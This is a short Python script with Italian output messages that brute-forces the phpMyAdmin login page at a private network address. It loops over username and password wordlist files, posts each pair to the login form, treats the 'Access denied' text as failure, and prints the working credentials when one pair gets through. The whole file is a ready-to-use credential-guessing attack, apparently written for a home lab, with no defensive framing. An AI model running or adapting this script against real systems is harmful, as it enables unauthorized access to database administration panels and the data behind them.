import requests
from colorama import Fore

def payload(u,p):
    return {"pma_username":u,"pma_password":p}

def http_call(u,p):
    try:
        with requests.post(url, payload(u, p)) as response :
            if error in response.text:
                print(Fore.RED + f"tentativo con username: \033[1;33;40m{u} e password: \033[1;33;40m{p} fallito")
                return False
            else:
               print(Fore.GREEN + f"siamo riusciti ad entrare la username è: \033[1;35;40m{u} la password è: \033[1;35;40m{p}")
               return True
            
    except Exception as e:
        print(f"riscontrato errore: {e} \n")
        
            
def open_file(file_name):
    with open(file_name) as file:
        return [line.strip() for line in file.readlines()]
    
error="Access denied for user"
url="http://192.168.50.101/phpMyAdmin/index.php"

usernames = open_file("usernames.txt")
passwords = open_file("prova.txt")


for username in usernames:
    for password in passwords:
        r=http_call(username, password)
        if (r==True): 
            break
    if (r==True):
        break

    

